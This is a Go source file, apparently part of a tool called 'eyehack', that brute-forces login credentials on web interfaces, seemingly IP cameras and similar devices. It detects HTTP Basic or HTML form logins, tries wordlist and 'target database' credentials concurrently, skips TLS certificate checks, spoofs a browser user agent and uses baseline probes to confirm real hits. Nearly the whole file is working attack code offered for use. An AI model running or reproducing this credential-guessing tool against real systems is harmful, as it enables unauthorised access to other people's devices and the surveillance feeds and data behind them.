package credbrute

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// OptimizedBruteForce performs concurrent credential testing against the given
// login URLs. It detects per-endpoint whether authentication is HTTP Basic or a
// classic HTML form and dispatches accordingly. Returns "user:pass" for the
// first credential that is accepted, or "" when nothing works.
func OptimizedBruteForce(ctx context.Context, host string, loginURLs []string, credFile string, timeout time.Duration) string {
	return OptimizedBruteForceKnown(ctx, host, loginURLs, credFile, nil, timeout)
}

// OptimizedBruteForceKnown is OptimizedBruteForce with credentials already
// known for this host (from the target database): they are tested before the
// wordlist, which may be empty or missing when known holds everything.
func OptimizedBruteForceKnown(ctx context.Context, host string, loginURLs []string, credFile string, known []string, timeout time.Duration) string {
	creds, err := loadCredentials(credFile)
	if err != nil {
		creds = nil
	}
	creds = prependKnown(creds, known)
	if len(creds) == 0 || len(loginURLs) == 0 {
		return ""
	}

	// Connection pooling + shared cookie jar (session cookies are stored per
	// host, so sharing across different hosts is safe).
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Timeout: timeout,
		Jar:     jar,
		Transport: &http.Transport{
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives:   false,
			MaxIdleConns:        50,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     30 * time.Second,
		},
	}

	var wg sync.WaitGroup
	resultChan := make(chan string, 1)

	for _, loginURL := range loginURLs {
		wg.Add(1)
		go func(loginURL string) {
			defer wg.Done()

			var cred string
			if requiresAuth(ctx, client, loginURL) {
				cred = bruteBasicURL(ctx, client, loginURL, creds)
				if cred != "" {
					log.Printf("DEBUG: [basic] %s accepted %s", loginURL, cred)
				}
			} else {
				cred = bruteFormURL(ctx, client, loginURL, creds, timeout)
				if cred != "" {
					log.Printf("DEBUG: [form] %s accepted %s", loginURL, cred)
				}
			}
			if cred != "" {
				select {
				case resultChan <- cred:
				default:
				}
			}
		}(loginURL)
	}

	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// Block until a credential succeeds (buffered push) or every URL goroutine
	// has finished and the channel is closed (zero value → "").
	return <-resultChan
}

// bruteBasicURL tries every credential using HTTP Basic auth against a single
// URL that answered 401/403. Returns the first accepted "user:pass" or "".
func bruteBasicURL(ctx context.Context, client *http.Client, loginURL string, creds []string) string {
	// Baseline: two attempts with credentials that cannot work. If the endpoint
	// does not answer them identically, its status code is not a function of the
	// credentials we send (some devices answer 200/401 at random) and no success
	// can ever be claimed on this URL.
	b1 := basicProbe(ctx, client, loginURL, baselineUser+":"+baselinePass)
	b2 := basicProbe(ctx, client, loginURL, baselineUser+":"+baselinePass)
	if b1.status == 0 || b2.status == 0 {
		return ""
	}
	if b1.status != b2.status || b1.location != b2.location ||
		normalizeBody(b1.body) != normalizeBody(b2.body) {
		log.Printf("DEBUG: [basic] %s answers inconsistently — refusing to guess", loginURL)
		return ""
	}
	baseFP := b1
	haveBase := true

	// Per-username baseline: some endpoints answer 401 to an unknown user but
	// 200 to any password for a user they do know. Measured only against the
	// impossible-user baseline, the first candidate for such a user looks like
	// a hit — so compare against the same username carrying a wrong password.
	userBase := make(map[string]respFP)
	for _, u := range distinctUsers(creds) {
		if fp := basicProbe(ctx, client, loginURL, u+":"+baselinePass); fp.status != 0 {
			userBase[u] = fp
		}
	}

	var (
		mu    sync.Mutex
		found string
		stop  = make(chan struct{})
		wg    sync.WaitGroup
		sem   = make(chan struct{}, 5)
	)
	for _, cred := range creds {
		wg.Add(1)
		go func(cred string) {
			defer wg.Done()
			select {
			case <-stop:
				return
			case sem <- struct{}{}:
			}
			defer func() { <-sem }()

			fp := basicProbe(ctx, client, loginURL, cred)
			if fp.status != http.StatusOK {
				return
			}
			user, _, ok := splitCred(cred)
			if !ok {
				return
			}
			if haveBase && sameOutcome(fp, baseFP) {
				return // identical to the guaranteed-wrong baseline
			}
			if ub, ok := userBase[user]; ok && sameOutcome(fp, ub) {
				return // identical to this username with a wrong password
			}
			mu.Lock()
			if found == "" {
				found = cred
				close(stop)
			}
			mu.Unlock()
		}(cred)
	}
	wg.Wait()
	return found
}

// distinctUsers returns the unique usernames in creds, first-seen order. The
// blank username is a username like any other: it must get its baseline too,
// or an endpoint accepting any password for an empty user would look like a
// verified "" credential.
func distinctUsers(creds []string) []string {
	seen := make(map[string]bool, len(creds))
	out := make([]string, 0, 9)
	for _, c := range creds {
		u, _, ok := splitCred(c)
		if !ok || seen[u] {
			continue
		}
		seen[u] = true
		out = append(out, u)
	}
	return out
}

// loginForm describes an HTML login form discovered on a page.
type loginForm struct {
	action      string // absolute URL to POST to ("" → the login URL itself)
	userField   string
	passField   string
	hidden      map[string]string
	hadPassword bool // the fetched page rendered a password input
}

// bruteFormURL fetches the login page, parses the form and tests every
// credential against it. Returns the first accepted "user:pass" or "".
func bruteFormURL(ctx context.Context, client *http.Client, loginURL string, creds []string, timeout time.Duration) string {
	// Isolate cookies per login URL so a failed session cannot poison others.
	jar, _ := cookiejar.New(nil)
	c := &http.Client{
		Timeout: timeout,
		Jar:     jar,
		Transport: &http.Transport{
			TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
			DisableKeepAlives: true,
		},
	}

	body, status, err := fetch(ctx, c, loginURL, "GET", "", nil)
	if err != nil || status != 200 {
		return ""
	}
	form := parseLoginForm(loginURL, body)
	if form == nil || form.passField == "" {
		return ""
	}
	log.Printf("DEBUG: [form] login form on %s (user=%q pass=%q action=%q) trying %d creds",
		loginURL, form.userField, form.passField, form.action, len(creds))

	postTo := loginURL
	if form.action != "" {
		postTo = form.action
	}

	// Baseline: one attempt with credentials that cannot work. Anything that
	// answers exactly like this was ignored by the endpoint and is a failure.
	baseFP, baseErr := postAttempt(ctx, c, postTo, form, baselineUser, baselinePass)
	haveBase := baseErr == nil && baseFP.status != 0

	// Per-username baseline: a device may accept ANY password for a username it
	// recognises while rejecting unknown users, in which case the candidate
	// would differ from the baseline above without a correct password. Probe
	// each distinct username once with a wrong password and hold the candidate
	// against that response instead.
	userBase := make(map[string]respFP)
	for _, u := range distinctUsers(creds) {
		fp, err := postAttempt(ctx, c, postTo, form, u, baselinePass)
		if err == nil && fp.status != 0 {
			userBase[u] = fp
		}
	}

	var (
		mu      sync.Mutex
		found   string
		stopped bool
		stop    = make(chan struct{})
		wg      sync.WaitGroup
		sem     = make(chan struct{}, 5)
	)
	// stopNow closes stop exactly once; callers must hold mu.
	stopNow := func() {
		if !stopped {
			stopped = true
			close(stop)
		}
	}
	for _, cred := range creds {
		wg.Add(1)
		go func(cred string) {
			defer wg.Done()
			select {
			case <-stop:
				return
			case sem <- struct{}{}:
			}
			defer func() { <-sem }()

			user, pass, ok := splitCred(cred)
			if !ok {
				return
			}
			fp, err := postAttempt(ctx, c, postTo, form, user, pass)
			if err != nil {
				return
			}
			// Locked out: further attempts are useless (and harmful) — stop now.
			if isLocked(fp.body) {
				mu.Lock()
				first := !stopped
				stopNow()
				mu.Unlock()
				if first {
					log.Printf("DEBUG: [form] %s locked out — stopping attempts", loginURL)
				}
				return
			}
			// Same answer as the guaranteed-wrong baseline → the endpoint did
			// not read what we sent, so this is not a successful login.
			if haveBase && sameOutcome(fp, baseFP) {
				return
			}
			if ub, ok := userBase[user]; ok && sameOutcome(fp, ub) {
				return // identical to this username with a wrong password
			}
			if loginSucceeded(fp.status, fp.location, fp.body, form) {
				out := cred
				if form.userField == "" {
					out = ":" + pass // no username field on this form
				}
				mu.Lock()
				if found == "" {
					found = out
				}
				stopNow()
				mu.Unlock()
			}
		}(cred)
	}
	wg.Wait()
	return found
}

// fetch performs a GET/HEAD-style request and returns body + status code.
func fetch(ctx context.Context, client *http.Client, rawURL, method, body string, header http.Header) (string, int, error) {
	var req *http.Request
	var err error
	if body != "" {
		req, err = http.NewRequestWithContext(ctx, method, rawURL, strings.NewReader(body))
	} else {
		req, err = http.NewRequestWithContext(ctx, method, rawURL, nil)
	}
	if err != nil {
		return "", 0, err
	}
	for k, vs := range header {
		for _, v := range vs {
			req.Header.Add(k, v)
		}
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	return readLimited(resp), resp.StatusCode, nil
}

// postForm submits a form and returns the body, status and Location header.
func postForm(ctx context.Context, client *http.Client, postTo string, vals url.Values) (string, int, string, error) {
	req, err := http.NewRequestWithContext(ctx, "POST", postTo, strings.NewReader(vals.Encode()))
	if err != nil {
		return "", 0, "", err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0")
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, "", err
	}
	defer resp.Body.Close()
	body := readLimited(resp)
	loc := ""
	if resp.Header.Get("Location") != "" {
		if ref, err := resp.Location(); err == nil {
			loc = ref.String()
		} else {
			loc = resp.Header.Get("Location")
		}
	}
	return body, resp.StatusCode, loc, nil
}

// readLimited reads up to 64 KiB of the response body in full (a single Read
// can return a partial buffer, which could truncate a form or success marker).
func readLimited(resp *http.Response) string {
	const maxBody = 64 * 1024
	b, _ := io.ReadAll(io.LimitReader(resp.Body, maxBody))
	return string(b)
}

// respFP is the observable outcome of a single login attempt.
type respFP struct {
	status   int
	location string
	body     string
}

// tokenRe blanks out every digit run plus long hex strings (nonces, timestamps,
// session ids, attempt counters) so a dynamically rendered page still compares
// equal to itself. Counters such as "Remaining Attempts: 2" -> "1" must not be
// mistaken for a different authentication outcome.
var tokenRe = regexp.MustCompile(`[0-9a-f]{8,}|\d+`)

// normalizeBody makes two response bodies comparable.
func normalizeBody(s string) string {
	s = tokenRe.ReplaceAllString(strings.ToLower(s), " ")
	return strings.Join(strings.Fields(s), " ")
}

// sameOutcome reports whether two attempts produced the same observable result.
// When a credential gets the exact answer a deliberately-wrong credential got,
// the endpoint ignored what we sent and no success can be claimed. This is the
// guard that catches endpoints always answering 200 with a fixed body.
func sameOutcome(a, b respFP) bool {
	if a.status != b.status || a.location != b.location {
		return false
	}
	return normalizeBody(a.body) == normalizeBody(b.body)
}

// baselineUser/baselinePass cannot plausibly be valid credentials.
const (
	baselineUser = "eyehack-baseline-user-9f3a7c1"
	baselinePass = "eyehack-baseline-pass-b72d4e8a"
)

// postAttempt submits the parsed form with one credential pair.
func postAttempt(ctx context.Context, c *http.Client, postTo string, form *loginForm, user, pass string) (respFP, error) {
	vals := make(url.Values, len(form.hidden)+2)
	for k, v := range form.hidden {
		vals.Set(k, v)
	}
	// Password-only logins have no username input to fill in.
	if form.userField != "" {
		vals.Set(form.userField, user)
	}
	vals.Set(form.passField, pass)

	body, status, loc, err := postForm(ctx, c, postTo, vals)
	return respFP{status: status, location: loc, body: body}, err
}

// basicProbe performs a GET carrying the given Basic credentials.
func basicProbe(ctx context.Context, client *http.Client, rawURL, cred string) respFP {
	req, err := http.NewRequestWithContext(ctx, "GET", rawURL, nil)
	if err != nil {
		return respFP{}
	}
	req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(cred)))
	resp, err := client.Do(req)
	if err != nil {
		return respFP{}
	}
	defer resp.Body.Close()
	return respFP{status: resp.StatusCode, body: readLimited(resp)}
}

// attrRe matches `attr="value"`, `attr='value'` or `attr=value`. Real-world
// camera HTML very frequently omits the quotes (e.g. `<input type=password>`),
// so the quotes must be optional.
func attrRe(attr string) *regexp.Regexp {
	return regexp.MustCompile(`(?i)\b` + attr + `\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
}

var (
	formRe    = regexp.MustCompile(`(?is)<form[^>]*?\baction\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))`)
	inputRe   = regexp.MustCompile(`(?is)<input[^>]*>`)
	nameAttr  = attrRe("name")
	typeAttr  = attrRe("type")
	valueAttr = attrRe("value")
	pwInputRe = regexp.MustCompile(`(?i)type\s*=\s*["']?password\b`)
	userKeys  = []string{"username", "user", "login", "logon", "account", "userid", "email", "name"}
)

// attrVal returns the first capture group of re that is non-empty, so it works
// for the quoted and unquoted alternatives.
func attrVal(re *regexp.Regexp, s string) string {
	m := re.FindStringSubmatch(s)
	if m == nil {
		return ""
	}
	for _, g := range m[1:] {
		if g != "" {
			return g
		}
	}
	return ""
}

// formAction returns the (possibly relative) action of the first form.
func formAction(body string) string {
	return attrVal(formRe, body)
}

// parseLoginForm extracts the login form from an HTML body. Returns nil when no
// password field is present (nothing to brute force). The username field may be
// empty for password-only logins (common on Grandstream/IPVM devices).
func parseLoginForm(baseURL, body string) *loginForm {
	f := &loginForm{hidden: map[string]string{}}

	if action := formAction(body); action != "" {
		if ref, err := url.Parse(action); err == nil {
			if base, err := url.Parse(baseURL); err == nil {
				f.action = base.ResolveReference(ref).String()
			}
		}
	}

	var textNames []string
	for _, tag := range inputRe.FindAllString(body, -1) {
		typ := strings.ToLower(attrVal(typeAttr, tag))
		if typ == "" {
			typ = "text"
		}
		name := attrVal(nameAttr, tag)

		switch typ {
		case "password":
			// Only the first password input is the account password — later
			// ones are usually a security/PIN code (e.g. safetyCode). A
			// nameless password input means JavaScript fills it in, so the
			// form cannot be submitted as-is.
			if !f.hadPassword {
				f.passField = name
				f.hadPassword = true
			}
			continue
		case "hidden":
			if name != "" {
				f.hidden[name] = attrVal(valueAttr, tag)
			}
			continue
		case "submit", "button", "image", "reset", "checkbox", "radio":
			continue // not a credential field
		}
		if name != "" {
			textNames = append(textNames, name)
		}
	}

	// Nothing testable: no password field at all, or a JavaScript-only one.
	if !f.hadPassword || f.passField == "" {
		return nil
	}
	for _, key := range userKeys {
		for _, n := range textNames {
			if strings.EqualFold(n, key) {
				f.userField = n
				break
			}
		}
		if f.userField != "" {
			break
		}
	}
	if f.userField == "" && len(textNames) > 0 {
		f.userField = textNames[0]
	}
	return f
}

// failureMarkers appear in error/lockout pages. Their presence always means the
// attempt failed — critically, a lockout page returns 200 with no password
// input and would otherwise be mistaken for a successful login.
var failureMarkers = []string{
	"invalid password", "incorrect password", "wrong password", "bad password",
	"password is incorrect", "password mismatch",
	"password is not recognized", "not recognized", // Grandstream / Dahua style
	"does not match", "doesn't match", "not acceptable",
	"remaining attempts", "remaining tries", "attempts left", // failure counters
	"login failed", "logon failed", "authentication failed", "auth failed",
	"login incorrect", "invalid login", "sign in failed", "failed to sign in",
	"invalid user", "invalid username", "wrong user", "incorrect user",
	"user does not exist", "unknown user",
	"access denied", "access privilege", "not authorized", "unauthorized",
	"login error", "loginerrform", "login error form",
	"too many login errors", "too many failed", "too many attempts",
	"device has been locked", "account locked", "lockout", "locked out",
	"try again later", "wrong credentials", "credentials are invalid",
}

// isLocked reports whether the response indicates the device locked us out, in
// which case further attempts are pointless (and harmful).
func isLocked(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "too many login errors") ||
		strings.Contains(lower, "device has been locked") ||
		strings.Contains(lower, "locked due to") ||
		strings.Contains(lower, "lockout")
}

// affirmativeMarkers are words that only appear once a session exists. A page
// that simply stops rendering the password field is NOT evidence of success —
// error pages ("your login password is not recognized") have no form either,
// and that assumption is exactly what produced the earlier false positives.
var affirmativeMarkers = []string{
	"logout", "log out", "sign out", "dashboard",
	"login successful", "logon successful", "successfully logged", "logged in",
	"welcome back", "main menu", "live view",
}

// loginSucceeded decides whether a form login attempt worked. Success requires
// positive evidence: a redirect away from the login page, or a page that talks
// about ending the session. Anything else — including a 200 with a plain error
// message — is treated as failure.
func loginSucceeded(status int, location, body string, form *loginForm) bool {
	lower := strings.ToLower(body)

	// Explicit failure/lockout signals win.
	for _, e := range failureMarkers {
		if strings.Contains(lower, e) {
			return false
		}
	}

	switch {
	case status == 401 || status == 403:
		return false
	case status >= 300 && status < 400:
		loc := strings.ToLower(location)
		// Redirecting back to a login page means we are not authenticated.
		if strings.Contains(loc, "login") || strings.Contains(loc, "signin") || strings.Contains(loc, "auth") {
			return false
		}
		return true
	case status != 200:
		return false
	}

	// Still rendering the password field → we are back on the login form.
	if form.hadPassword && pwInputRe.MatchString(lower) {
		return false
	}
	// Success must be asserted by the page itself. Defaulting to success just
	// because the password input disappeared is what produced the false
	// positives: error pages carry no form either.
	for _, s := range affirmativeMarkers {
		if strings.Contains(lower, s) {
			return true
		}
	}
	return false
}

// loadCredentials loads credentials from file with caching
var credCache = struct {
	creds []string
	file  string
	mutex sync.RWMutex
}{}

func loadCredentials(credFile string) ([]string, error) {
	credCache.mutex.RLock()
	if credCache.file == credFile && len(credCache.creds) > 0 {
		creds := make([]string, len(credCache.creds))
		copy(creds, credCache.creds)
		credCache.mutex.RUnlock()
		return creds, nil
	}
	credCache.mutex.RUnlock()

	file, err := os.Open(credFile)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var creds []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			creds = append(creds, line)
		}
	}

	credCache.mutex.Lock()
	credCache.creds = creds
	credCache.file = credFile
	credCache.mutex.Unlock()

	return creds, scanner.Err()
}

// prependKnown returns known "user:pass" pairs ahead of the wordlist, without
// duplicates and without mutating either input. Known credentials come from the
// target database and are tested first, so a pair already recorded for the host
// is never buried behind a long wordlist.
func prependKnown(creds, known []string) []string {
	if len(known) == 0 {
		return creds
	}
	out := make([]string, 0, len(creds)+len(known))
	seen := make(map[string]bool, len(creds)+len(known))
	for _, c := range known {
		if c == "" || seen[c] {
			continue
		}
		seen[c] = true
		out = append(out, c)
	}
	for _, c := range creds {
		if c == "" || seen[c] {
			continue
		}
		seen[c] = true
		out = append(out, c)
	}
	return out
}

// requiresAuth checks if URL requires HTTP Basic authentication.
func requiresAuth(ctx context.Context, client *http.Client, url string) bool {
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return false
	}
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	auth := resp.Header.Get("WWW-Authenticate")
	return auth != "" || resp.StatusCode == 401 || resp.StatusCode == 403
}

// splitCred splits "user:pass" into its two halves.
func splitCred(cred string) (string, string, bool) {
	parts := strings.SplitN(cred, ":", 2)
	if len(parts) != 2 {
		return "", "", false
	}
	return parts[0], parts[1], true
}
